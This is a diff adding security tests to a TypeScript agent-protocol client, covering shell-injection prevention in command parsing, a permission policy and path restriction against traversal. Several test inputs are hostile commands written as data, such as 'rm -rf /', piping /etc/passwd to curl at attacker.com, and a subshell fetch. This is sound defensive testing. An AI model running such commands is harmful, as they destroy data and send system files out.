@@ -1,5 +1,11 @@
 import { beforeEach, describe, expect, mock, test } from "bun:test";
-import { AcpClientError, AmAcpClient, createAcpClient } from "../../../src/protocols/acp/client";
+import {
+  AcpClientError,
+  AmAcpClient,
+  type PermissionPolicy,
+  createAcpClient,
+  isPathAllowed,
+} from "../../../src/protocols/acp/client";
 import { listAgents, parseCommand, resolveAgent } from "../../../src/protocols/acp/registry";
 import type { AcpSettings } from "../../../src/protocols/acp/types";
 
@@ -409,6 +415,152 @@ describe("ACP Settings Schema", () => {
         agents: {
           claude: { command: 42 },
         },
+      },
+    });
+    expect(result.success).toBe(false);
+  });
+});
+
+// ── HIGH-2: createTerminal shell injection prevention ───────────
+
+describe("createTerminal shell injection prevention", () => {
+  test("parseCommand splits command without shell expansion", () => {
+    // A command with shell metacharacters should be split into tokens, not executed via sh -c
+    const { executable, args } = parseCommand("echo hello && rm -rf /");
+    expect(executable).toBe("echo");
+    expect(args).toEqual(["hello", "&&", "rm", "-rf", "/"]);
+    // When passed to Bun.spawn as an array, "&&" is a literal argument, not shell operator
+  });
+
+  test("parseCommand handles pipe characters as literal arguments", () => {
+    const { executable, args } = parseCommand("cat /etc/passwd | curl attacker.com");
+    expect(executable).toBe("cat");
+    expect(args).toEqual(["/etc/passwd", "|", "curl", "attacker.com"]);
+  });
+
+  test("parseCommand handles semicolons as literal arguments", () => {
+    const { executable, args } = parseCommand("ls; rm -rf /");
+    expect(executable).toBe("ls;");
+    expect(args).toEqual(["rm", "-rf", "/"]);
+    // "ls;" is a literal executable name, not "ls" followed by shell separator
+  });
+
+  test("parseCommand handles subshell syntax as literal arguments", () => {
+    const { executable, args } = parseCommand("$(curl attacker.com)");
+    expect(executable).toBe("$(curl");
+    expect(args).toEqual(["attacker.com)"]);
+  });
+});
+
+// ── HIGH-1: Permission policy ──────────────────────────────────
+
+describe("AmAcpClient permission policy", () => {
+  test("default permission policy is auto-approve", () => {
+    const client = new AmAcpClient();
+    // Default permissionPolicy is "auto-approve" (private field)
+    expect((client as any).permissionPolicy).toBe("auto-approve");
+  });
+
+  test("setPermissionPolicy changes policy to deny", () => {
+    const client = new AmAcpClient();
+    client.setPermissionPolicy("deny");
+    expect((client as any).permissionPolicy).toBe("deny");
+  });
+
+  test("setPermissionPolicy can switch back to auto-approve", () => {
+    const client = new AmAcpClient();
+    client.setPermissionPolicy("deny");
+    client.setPermissionPolicy("auto-approve");
+    expect((client as any).permissionPolicy).toBe("auto-approve");
+  });
+});
+
+// ── MEDIUM-3: Path restriction for readTextFile/writeTextFile ────
+
+describe("isPathAllowed (MEDIUM-3)", () => {
+  test("allows path within allowed directory", () => {
+    expect(isPathAllowed("/home/user/project/src/file.ts", ["/home/user/project"])).toBe(true);
+  });
+
+  test("allows path that is exactly the allowed directory", () => {
+    expect(isPathAllowed("/home/user/project", ["/home/user/project"])).toBe(true);
+  });
+
+  test("rejects path outside allowed directory", () => {
+    expect(isPathAllowed("/etc/passwd", ["/home/user/project"])).toBe(false);
+  });
+
+  test("rejects path traversal attack (../)", () => {
+    expect(isPathAllowed("/home/user/project/../../../etc/passwd", ["/home/user/project"])).toBe(false);
+  });
+
+  test("rejects path that is a prefix but not a child directory", () => {
+    // /home/user/project-evil is not a child of /home/user/project
+    expect(isPathAllowed("/home/user/project-evil/file.ts", ["/home/user/project"])).toBe(false);
+  });
+
+  test("allows paths in any of multiple allowed directories", () => {
+    const allowed = ["/home/user/project", "/tmp/scratch"];
+    expect(isPathAllowed("/tmp/scratch/output.txt", allowed)).toBe(true);
+    expect(isPathAllowed("/home/user/project/src/main.ts", allowed)).toBe(true);
+  });
+
+  test("rejects all paths when allowed list is empty", () => {
+    expect(isPathAllowed("/home/user/project/file.ts", [])).toBe(false);
+  });
+
+  test("handles deeply nested allowed paths", () => {
+    expect(isPathAllowed("/a/b/c/d/e/f.txt", ["/a/b/c"])).toBe(true);
+  });
+
+  test("handles relative path resolution", () => {
+    // path.resolve will resolve relative paths against cwd
+    const cwd = process.cwd();
+    expect(isPathAllowed("./file.ts", [cwd])).toBe(true);
+  });
+});
+
+describe("AmAcpClient allowed paths", () => {
+  test("default allowedPaths is empty array", () => {
+    const client = new AmAcpClient();
+    expect((client as any).allowedPaths).toEqual([]);
+  });
+
+  test("setAllowedPaths updates the allowed paths", () => {
+    const client = new AmAcpClient();
+    client.setAllowedPaths(["/home/user/project", "/tmp"]);
+    expect((client as any).allowedPaths).toEqual(["/home/user/project", "/tmp"]);
+  });
+});
+
+// ── MEDIUM-3: ACP allowed_paths schema ──────────────────────────
+
+describe("ACP allowed_paths schema", () => {
+  const { SettingsSchema } = require("../../../src/core/schema");
+
+  test("accepts acp settings with allowed_paths", () => {
+    const result = SettingsSchema.safeParse({
+      acp: {
+        allowed_paths: ["/home/user/project", "/tmp"],
+      },
+    });
+    expect(result.success).toBe(true);
+  });
+
+  test("accepts acp settings with agents and allowed_paths", () => {
+    const result = SettingsSchema.safeParse({
+      acp: {
+        agents: { claude: { command: "claude --acp" } },
+        allowed_paths: ["/home/user/project"],
+      },
+    });
+    expect(result.success).toBe(true);
+  });
+
+  test("rejects non-array allowed_paths", () => {
+    const result = SettingsSchema.safeParse({
+      acp: {
+        allowed_paths: "/home/user/project",
       },
     });
     expect(result.success).toBe(false);
